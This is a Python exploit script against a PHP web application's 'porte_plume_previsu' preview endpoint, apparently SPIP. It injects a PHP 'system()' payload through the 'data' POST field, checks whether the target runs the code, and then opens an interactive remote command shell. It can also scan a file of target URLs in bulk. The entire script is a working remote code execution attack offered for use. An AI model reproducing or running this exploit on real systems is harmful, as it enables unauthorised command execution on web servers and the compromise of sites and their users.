#!/usr/bin/python3

import httpx
import asyncio
import sys
from bs4 import BeautifulSoup as bs4

path = '/index.php?action=porte_plume_previsu'

async def single_url(url, path):
    async with httpx.AsyncClient(verify=False) as client:
            data = {
                'data': 'AA_[<img111111>->URL`<?php system("id");?>`]_BB'
            }
            try:
                r = await client.post(url=f'{url}{path}', data=data)
            except httpx.ConnectTimeout:
                print('[*] Problems with host')   
            soup = bs4(r.text, 'html.parser')
            try:
                output = soup.a.string.split('"')[0]
            except AttributeError:
                vulnurable = False
                output = False
                
            if output:
                vulnurable = True
            else:
                vulnurable = False
                print(f'{url} not vulnurable')
            if vulnurable:
                while True:
                    command = input('$ ')
                    if command == 'exit':
                        print('[*] Exiting from shell')
                        break
                    elif command == 'clear':
                        sys.stdout.write("\x1b[2J\x1b[H")
                        continue
                    elif command.strip() == '':
                        continue
                    shell_data = {
                        'data': f'AA_[<img111111>->URL`<?php system("{command}");?>`]_BB'
                    }
                    try:
                        req = await client.post(url=f'{url}{path}', data=shell_data)
                        soup = bs4(req.text, 'html.parser')
                        output = soup.a.string.split('"')[0]
                        print(output)
                    except httpx.ReadTimeout:
                        continue

async def list_urls(file, path):
    async with httpx.AsyncClient(verify=False) as client:
        with open(file) as t_file:
            targets = t_file.readlines()
            for target in targets:
                target = target.replace('\n', '')
                print(f'[*] Testing {target}')
                await single_url(target, path)
                continue
        
if len(sys.argv) < 2:
    print(f'Usage: python3 {sys.argv[0]} -u https://example.org\npython3 {sys.argv[0]} -l targets.txt')
else:
    if sys.argv[1] == '-u':
        asyncio.run(single_url(sys.argv[2], path))
    elif sys.argv[1] == '-l':
        asyncio.run(list_urls(sys.argv[2], path))
    else:
        print(f'Usage: python3 {sys.argv[0]} -u https://example.org\npython3 {sys.argv[0]} -l targets.txt')